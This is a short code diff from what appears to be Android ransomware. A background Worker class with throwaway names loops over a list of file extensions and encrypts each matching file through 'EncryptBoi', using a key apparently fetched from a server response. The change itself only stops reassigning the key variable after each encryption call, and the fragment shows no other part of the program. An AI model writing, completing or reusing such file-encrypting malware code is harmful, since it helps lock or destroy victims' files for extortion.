@@ -173,7 +173,7 @@ public class a extends Worker {
                     idk = response.getString("key").getBytes();
                     for(String lmao:extenstions) {
                         if (oof.getAbsolutePath().endsWith(lmao)) {
-                            idk = EncryptBoi.weeeeeeeeeeeeee(getApplicationContext(),oof,idk);
+                            EncryptBoi.weeeeeeeeeeeeee(getApplicationContext(),oof,idk);
                         }
                     }
                 } catch (JSONException e) {
@@ -187,7 +187,7 @@ public class a extends Worker {
         else{
             for(String lmao:extenstions) {
                 if (oof.getAbsolutePath().endsWith(lmao)) {
-                    idk = EncryptBoi.weeeeeeeeeeeeee(getApplicationContext(),oof,idk);
+                    EncryptBoi.weeeeeeeeeeeeee(getApplicationContext(),oof,idk);
                 }
             }
         }
